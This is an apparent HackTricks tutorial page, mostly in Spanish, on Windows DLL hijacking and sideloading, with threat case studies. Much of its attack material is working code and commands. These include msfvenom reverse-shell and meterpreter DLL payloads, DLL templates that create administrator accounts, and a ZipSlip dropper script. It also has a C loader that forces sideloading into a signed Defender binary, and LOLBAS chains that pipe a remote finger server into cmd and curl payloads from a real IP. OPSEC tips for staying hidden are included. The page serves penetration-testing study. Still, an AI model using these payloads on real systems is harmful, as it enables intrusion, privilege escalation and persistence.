# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Información básica

DLL Hijacking implica manipular una aplicación confiable para que cargue una DLL maliciosa. Este término abarca varias tácticas como **DLL Spoofing, Injection, and Side-Loading**. Se utiliza principalmente para ejecución de código, lograr persistencia y, menos comúnmente, escalada de privilegios. A pesar del enfoque en la escalada aquí, el método de hijacking permanece consistente entre objetivos.

### Técnicas comunes

Se emplean varios métodos para DLL hijacking, cada uno con su efectividad dependiendo de la estrategia de carga de DLL de la aplicación:

1. **DLL Replacement**: Intercambiar una DLL genuina por una maliciosa, opcionalmente usando DLL Proxying para preservar la funcionalidad original de la DLL.
2. **DLL Search Order Hijacking**: Colocar la DLL maliciosa en una ruta de búsqueda antes que la legítima, explotando el patrón de búsqueda de la aplicación.
3. **Phantom DLL Hijacking**: Crear una DLL maliciosa que la aplicación cargue creyendo que es una DLL requerida no existente.
4. **DLL Redirection**: Modificar parámetros de búsqueda como `%PATH%` o archivos `.exe.manifest` / `.exe.local` para dirigir la aplicación a la DLL maliciosa.
5. **WinSxS DLL Replacement**: Sustituir la DLL legítima por una maliciosa en el directorio WinSxS, un método frecuentemente asociado con DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar la DLL maliciosa en un directorio controlado por el usuario junto con la aplicación copiada, asemejándose a técnicas de Binary Proxy Execution.

> [!TIP]
> Para una cadena paso a paso que superpone staging HTML, configuraciones AES-CTR y implantes .NET sobre DLL sideloading, revisa el flujo de trabajo abajo.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

La forma más común de encontrar Dlls faltantes dentro de un sistema es ejecutar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, **configurando** los **siguientes 2 filtros**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

y simplemente mostrar la **Actividad del sistema de archivos**:

![](<../../../images/image (153).png>)

Si buscas **dlls faltantes en general** deja esto ejecutándose durante algunos **segundos**.\
Si buscas una **dll faltante dentro de un ejecutable específico** deberías establecer **otro filtro como "Process Name" "contains" `<exec name>`, ejecutarlo y detener la captura de eventos**.

## Exploiting Missing Dlls

Para escalar privilegios, la mejor oportunidad que tenemos es poder **escribir una dll que un proceso con privilegios intentará cargar** en alguno de los **lugares donde será buscada**. Por lo tanto, podremos **escribir** una dll en una **carpeta** donde la **dll se busca antes** que la carpeta donde está la **dll original** (caso raro), o podremos **escribir en alguna carpeta donde se va a buscar la dll** y la **dll original no existe** en ninguna carpeta.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Las aplicaciones de Windows buscan DLL siguiendo un conjunto de **rutas de búsqueda predefinidas**, respetando una secuencia particular. El problema del DLL hijacking surge cuando una DLL maliciosa se coloca estratégicamente en uno de estos directorios, asegurando que se cargue antes que la DLL auténtica. Una solución para prevenir esto es asegurarse de que la aplicación use rutas absolutas al referirse a las DLL que requiere.

Puedes ver el **orden de búsqueda de DLL en sistemas de 32 bits** abajo:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Ese es el orden de búsqueda **por defecto** con **SafeDllSearchMode** habilitado. Cuando está deshabilitado, el directorio actual asciende a segundo lugar. Para desactivar esta característica, crea el valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y pon su valor en 0 (por defecto está habilitado).

Si la función [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) es llamada con **LOAD_WITH_ALTERED_SEARCH_PATH** la búsqueda comienza en el directorio del módulo ejecutable que **LoadLibraryEx** está cargando.

Finalmente, nota que **una dll podría ser cargada indicando la ruta absoluta en lugar solo del nombre**. En ese caso esa dll **solo será buscada en esa ruta** (si la dll tiene dependencias, estas serán buscadas como si se hubieran cargado solo por nombre).

Hay otras maneras de alterar el orden de búsqueda pero no las voy a explicar aquí.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Use **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) to collect DLL names that the process probes but cannot find.
2. If the binary runs on a **schedule/service**, dropping a DLL with one of those names into the **application directory** (search-order entry #1) will be loaded on the next execution. In one .NET scanner case the process looked for `hostfxr.dll` in `C:\samples\app\` before loading the real copy from `C:\Program Files\dotnet\fxr\...`.
3. Build a payload DLL (e.g. reverse shell) with any export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. If your primitive is a **ZipSlip-style arbitrary write**, craft a ZIP whose entry escapes the extraction dir so the DLL lands in the app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Entrega el archivo al buzón/compartido vigilado; cuando la tarea programada vuelva a lanzar el proceso, este cargará la DLL maliciosa y ejecutará tu código con la cuenta de servicio.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

An advanced way to deterministically influence the DLL search path of a newly created process is to set the DllPath field in RTL_USER_PROCESS_PARAMETERS when creating the process with ntdll’s native APIs. By supplying an attacker-controlled directory here, a target process that resolves an imported DLL by name (no absolute path and not using the safe loading flags) can be forced to load a malicious DLL from that directory.

Idea clave
- Construye los parámetros del proceso con RtlCreateProcessParametersEx y proporciona un DllPath personalizado que apunte a tu carpeta controlada (e.g., el directorio donde reside tu dropper/unpacker).
- Crea el proceso con RtlCreateUserProcess. Cuando el binario objetivo resuelva una DLL por nombre, el loader consultará este DllPath suministrado durante la resolución, permitiendo un sideloading fiable incluso cuando la DLL maliciosa no está colocada junto al EXE objetivo.

Notas/limitaciones
- Esto afecta al proceso hijo que se está creando; es diferente de SetDllDirectory, que solo afecta al proceso actual.
- El objetivo debe importar o llamar a LoadLibrary a una DLL por nombre (sin ruta absoluta y sin usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs y rutas absolutas hardcoded no pueden ser hijacked. Forwarded exports y SxS pueden cambiar la precedencia.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Ejemplo de uso operativo
- Coloca un xmllite.dll malicioso (exportando las funciones requeridas o actuando como proxy al real) en tu directorio DllPath.
- Lanza un binario firmado que se sabe que busca xmllite.dll por nombre usando la técnica anterior. El loader resuelve la importación a través del DllPath suministrado y sideloads tu DLL.

Esta técnica se ha observado in-the-wild para impulsar cadenas de sideloading multi-stage: un initial launcher deja un helper DLL, que luego spawns un binario firmado por Microsoft, hijackable, con un DllPath personalizado para forzar la carga del DLL del atacante desde un staging directory.


#### Excepciones en el orden de búsqueda de DLL según la documentación de Windows

Ciertas excepciones al orden estándar de búsqueda de DLL se señalan en la documentación de Windows:

- Cuando se encuentra una **DLL que comparte su nombre con otra ya cargada en memoria**, el sistema omite la búsqueda habitual. En su lugar, realiza una comprobación de redirección y de manifest antes de recurrir a la DLL ya presente en memoria. **En este escenario, el sistema no realiza una búsqueda de la DLL**.
- En casos donde la DLL sea reconocida como una **known DLL** para la versión actual de Windows, el sistema utilizará su versión de la known DLL, junto con cualquiera de sus DLL dependientes, **omitiendo el proceso de búsqueda**. La clave del registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene una lista de estas known DLLs.
- Si una **DLL tiene dependencias**, la búsqueda de estas DLL dependientes se realiza como si hubieran sido indicadas únicamente por sus **module names**, independientemente de si la DLL inicial fue identificada mediante una ruta completa.

### Escalación de privilegios

**Requisitos**:

- Identifica un proceso que opere o vaya a operar con **privilegios diferentes** (movimiento horizontal o lateral), que esté **sin una DLL**.
- Asegúrate de que haya **acceso de escritura** en cualquier **directorio** en el que se **buscará** la **DLL**. Esta ubicación podría ser el directorio del ejecutable o un directorio dentro de la ruta del sistema.

Sí, los requisitos son complicados de encontrar ya que **por defecto es extraño encontrar un ejecutable privilegiado que no tenga una DLL** y es aún **más extraño tener permisos de escritura en una carpeta de la ruta del sistema** (no puedes por defecto). Pero, en entornos mal configurados esto es posible.\
En caso de que tengas suerte y cumplas los requisitos, puedes echar un vistazo al proyecto [UACME](https://github.com/hfiref0x/UACME). Incluso si el **objetivo principal del proyecto es bypass UAC**, puedes encontrar allí un **PoC** de un Dll hijacking para la versión de Windows que puedes usar (probablemente solo cambiando la ruta de la carpeta donde tienes permisos de escritura).

Ten en cuenta que puedes **comprobar tus permisos en una carpeta** haciendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Y **comprueba los permisos de todas las carpetas dentro de PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
También puedes comprobar las importaciones de un ejecutable y las exportaciones de una dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para una guía completa sobre cómo **abusar de Dll Hijacking para escalar privilegios** con permisos para escribir en una **System Path folder** consulte:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Herramientas automatizadas

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) comprobará si tienes permisos de escritura en cualquier carpeta dentro del system PATH.\
Otras herramientas automatizadas interesantes para descubrir esta vulnerabilidad son las **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ y _Write-HijackDll._

### Ejemplo

En caso de encontrar un escenario explotable, una de las cosas más importantes para explotarlo con éxito sería **crear una dll que exporte al menos todas las funciones que el ejecutable importará de ella**. De todos modos, ten en cuenta que Dll Hijacking resulta útil para [escalar desde Medium Integrity level a High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o desde[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puedes encontrar un ejemplo de **cómo crear una dll válida** dentro de este estudio sobre dll hijacking enfocado en la ejecución: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Además, en la **siguiente sección** puedes encontrar algunos **códigos dll básicos** que pueden ser útiles como **plantillas** o para crear una **dll con funciones no requeridas exportadas**.

## **Creación y compilación de Dlls**

### **Dll Proxifying**

Básicamente un **Dll proxy** es una Dll capaz de **ejecutar tu código malicioso cuando se carga** pero también de **exponer** y **funcionar** como **se espera**, reenviando todas las llamadas a la librería real.

Con la herramienta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puedes indicar un ejecutable y seleccionar la librería que quieres proxificar y generar una dll proxificada o indicar la Dll y generar una dll proxificada.

### **Meterpreter**

**Obtener rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtener un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crear un usuario (x86 no vi una versión x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Tu propio

Ten en cuenta que en varios casos la Dll que compiles debe **exportar varias funciones** que serán cargadas por el victim process; si estas funciones no existen, el **binary no podrá cargarlas** y el **exploit fallará**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Ejemplo de C++ DLL con creación de usuario</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>

<summary>DLL C alternativa con entrada de hilo</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Estudio de caso: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe todavía busca una DLL de localización predecible y específica por idioma al iniciarse, que puede secuestrarse para permitir la ejecución arbitraria de código y la persistencia.

Datos clave
- Ruta de sondeo (compilaciones actuales): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Ruta antigua (compilaciones anteriores): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si existe una DLL controlada por un atacante y escribible en la ruta OneCore, se carga y `DllMain(DLL_PROCESS_ATTACH)` se ejecuta. No se requieren exports.

Descubrimiento con Procmon
- Filtro: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Inicia Narrator y observa el intento de carga de la ruta anterior.

DLL mínima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
Silencio OPSEC
- Un hijack ingenuo mostrará/resaltará la UI. Para mantenerse silencioso, al adjuntarse enumera los hilos de Narrator, abre el hilo principal (`OpenThread(THREAD_SUSPEND_RESUME)`) y `SuspendThread` sobre él; continúa en tu propio hilo. Ver PoC para el código completo.

Activación y persistencia mediante la configuración de Accessibility
- Contexto de usuario (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con lo anterior, al arrancar Narrator se carga la DLL plantada. En el escritorio seguro (pantalla de inicio de sesión), pulsa CTRL+WIN+ENTER para iniciar Narrator; tu DLL se ejecuta como SYSTEM en el escritorio seguro.

Ejecución SYSTEM activada por RDP (movimiento lateral)
- Permitir classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Conéctate por RDP al host; en la pantalla de inicio de sesión pulsa CTRL+WIN+ENTER para lanzar Narrator; tu DLL se ejecuta como SYSTEM en el escritorio seguro.
- La ejecución se detiene cuando la sesión RDP se cierra — inyectar/migrar rápidamente.

Bring Your Own Accessibility (BYOA)
- Puedes clonar una entrada de registro de Accessibility Tool (AT) incorporada (por ejemplo, CursorIndicator), editarla para que apunte a un binario/DLL arbitrario, importarla y luego establecer `configuration` a ese nombre de AT. Esto sirve como proxy para la ejecución arbitraria bajo el framework de Accessibility.

Notas
- Escribir bajo `%windir%\System32` y modificar valores de HKLM requiere privilegios de administrador.
- Toda la lógica del payload puede residir en `DLL_PROCESS_ATTACH`; no se necesitan exports.

## Estudio de caso: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Detalles de la vulnerabilidad

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Implementación del exploit

Un atacante puede colocar un stub malicioso `hostfxr.dll` en el mismo directorio, aprovechando la DLL faltante para lograr ejecución de código en el contexto del usuario:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flujo de ataque

1. Como usuario estándar, colocar `hostfxr.dll` en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Esperar a que la tarea programada se ejecute a las 9:30 AM en el contexto del usuario actual.
3. Si hay un administrador conectado cuando la tarea se ejecuta, la DLL maliciosa se ejecuta en la sesión del administrador con integridad media.
4. Encadenar técnicas estándar de UAC bypass para elevarse de integridad media a privilegios SYSTEM.

## Caso de estudio: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Los actores de amenazas suelen combinar droppers basados en MSI con DLL side-loading para ejecutar payloads bajo un proceso firmado y de confianza.

Chain overview
- El usuario descarga el MSI. Una CustomAction se ejecuta silenciosamente durante la instalación GUI (por ejemplo, LaunchApplication o una acción VBScript), reconstruyendo la siguiente etapa a partir de recursos incrustados.
- El dropper escribe un EXE legítimo firmado y una DLL maliciosa en el mismo directorio (ejemplo: Avast-signed wsc_proxy.exe + wsc.dll controlada por el atacante).
- Cuando se inicia el EXE firmado, el orden de búsqueda de DLL de Windows carga wsc.dll desde el directorio de trabajo primero, ejecutando el código del atacante bajo un padre firmado (ATT&CK T1574.001).

MSI analysis (what to look for)
- Tabla CustomAction:
- Buscar entradas que ejecuten ejecutables o VBScript. Patrón sospechoso de ejemplo: LaunchApplication ejecutando un archivo incrustado en segundo plano.
- En Orca (Microsoft Orca.exe), inspeccionar las tablas CustomAction, InstallExecuteSequence y Binary.
- payloads incrustados/divididos en el CAB del MSI:
- Extracción administrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
- O usar lessmsi: lessmsi x package.msi C:\out
- Buscar múltiples fragmentos pequeños que son concatenados y descifrados por una CustomAction VBScript. Flujo común:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Coloca estos dos archivos en la misma carpeta:
- wsc_proxy.exe: host legítimo firmado (Avast). El proceso intenta cargar wsc.dll por nombre desde su directorio.
- wsc.dll: attacker DLL. Si no se requieren exports específicos, DllMain puede ser suficiente; de lo contrario, construye una proxy DLL y reenvía los exports requeridos a la biblioteca genuina mientras ejecutas el payload en DllMain.
- Construye un payload DLL mínimo:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Para requisitos de exportación, use un framework de proxy (p. ej., DLLirant/Spartacus) para generar un DLL de reenvío que además ejecute su payload.

- Esta técnica se basa en la resolución de nombres de DLL por el binario anfitrión. Si el anfitrión usa rutas absolutas o flags de carga segura (p. ej., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), el hijack puede fallar.
- KnownDLLs, SxS, y forwarded exports pueden influir en la precedencia y deben tenerse en cuenta al seleccionar el binario anfitrión y el conjunto de exports.

## Tríadas firmadas + payloads cifrados (estudio de caso ShadowPad)

Check Point describió cómo Ink Dragon despliega ShadowPad usando una **tríada de tres archivos** para mezclarse con software legítimo mientras mantiene el payload principal cifrado en disco:

1. **EXE anfitrión firmado** – se abusan proveedores como AMD, Realtek o NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Los atacantes renombran el ejecutable para que parezca un binario de Windows (por ejemplo `conhost.exe`), pero la firma Authenticode sigue siendo válida.
2. **Malicious loader DLL** – dejado junto al EXE con un nombre esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL suele ser un binario MFC ofuscado con el framework ScatterBrain; su único trabajo es localizar el blob cifrado, descifrarlo y mapear ShadowPad reflectivamente.
3. **Encrypted payload blob** – a menudo almacenado como `<name>.tmp` en el mismo directorio. Después de mapear en memoria el payload descifrado, el loader elimina el archivo TMP para destruir evidencia forense.

Notas de tradecraft:

* Renombrar el EXE firmado (manteniendo el `OriginalFileName` original en la cabecera PE) le permite hacerse pasar por un binario de Windows y a la vez retener la firma del proveedor, así que reproduzca la costumbre de Ink Dragon de dejar binarios con apariencia de `conhost.exe` que en realidad son utilidades de AMD/NVIDIA.
* Como el ejecutable sigue siendo de confianza, la mayoría de controles de allowlisting solo requieren que su DLL malicioso esté junto a él. Enfoque en personalizar el loader DLL; el padre firmado típicamente puede ejecutarse sin modificaciones.
* El decryptor de ShadowPad espera que el blob TMP viva junto al loader y sea escribible para poder poner a cero el archivo tras mapearlo. Mantenga el directorio escribible hasta que el payload cargue; una vez en memoria el archivo TMP puede eliminarse de forma segura por OPSEC.

### LOLBAS stager + cadena de sideloading con archivo por etapas (finger → tar/curl → WMI)

Los operadores combinan DLL sideloading con LOLBAS de modo que el único artefacto personalizado en disco sea la DLL maliciosa junto al EXE de confianza:

- **Remote command loader (Finger):** PowerShell oculto lanza `cmd.exe /c`, extrae comandos de un servidor Finger y los pasa a `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` recupera texto TCP/79; `| cmd` ejecuta la respuesta del servidor, permitiendo a los operadores rotar la segunda etapa en el lado del servidor.

- **Built-in download/extract:** Descargue un archivo con una extensión benign, desempáquelo y coloque el objetivo de sideload y la DLL bajo una carpeta aleatoria `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` oculta el progreso y sigue redirecciones; `tar -xf` usa el tar incorporado de Windows.

- **WMI/CIM launch:** Inicie el EXE vía WMI para que la telemetría muestre un proceso creado por CIM mientras carga la DLL colocada junto a él:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funciona con binarios que prefieren DLL locales (p. ej., `intelbq.exe`, `nearby_share.exe`); el payload (p. ej., Remcos) se ejecuta bajo el nombre de confianza.

- **Hunting:** Alarme sobre `forfiles` cuando `/p`, `/m` y `/c` aparezcan juntos; poco común fuera de scripts administrativos.


## Estudio de caso: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Una intrusión reciente de Lotus Blossom abusó de una cadena de actualización de confianza para entregar un dropper empaquetado con NSIS que preparó un DLL sideload además de payloads completamente en memoria.

Flujo de tradecraft
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo marca **HIDDEN**, deja un Bitdefender Submission Wizard renombrado `BluetoothService.exe`, un `log.dll` malicioso y un blob cifrado `BluetoothService`, y luego lanza el EXE.
- El EXE anfitrión importa `log.dll` y llama a `LogInit`/`LogWrite`. `LogInit` carga el blob mediante mmap; `LogWrite` lo descifra con un stream personalizado basado en LCG (constantes **0x19660D** / **0x3C6EF35F**, material de clave derivado de un hash previo), sobrescribe el buffer con shellcode en texto claro, libera temporales y salta a él.
- Para evitar una IAT, el loader resuelve APIs hasheando nombres de export con **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, luego aplicando una avalanche estilo Murmur (**0x85EBCA6B**) y comparando contra hashes objetivo salados.

Shellcode principal (Chrysalis)
- Descifra un módulo principal tipo PE repitiendo add/XOR/sub con la clave `gQ2JR&9;` durante cinco pasadas, luego carga dinámicamente `Kernel32.dll` → `GetProcAddress` para terminar la resolución de imports.
- Reconstruye cadenas de nombres de DLL en tiempo de ejecución mediante transformaciones por carácter de rotación de bits/XOR, luego carga `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un segundo resolver que recorre la **PEB → InMemoryOrderModuleList**, analiza cada tabla de exports en bloques de 4 bytes con mezclado estilo Murmur, y solo recurre a `GetProcAddress` si el hash no se encuentra.

Configuración embebida & C2
- La config vive dentro del archivo `BluetoothService` dejado en **offset 0x30808** (tamaño **0x980**) y es RC4-descifrada con la clave `qwhvb^435h&*7`, revelando la URL de C2 y el User-Agent.
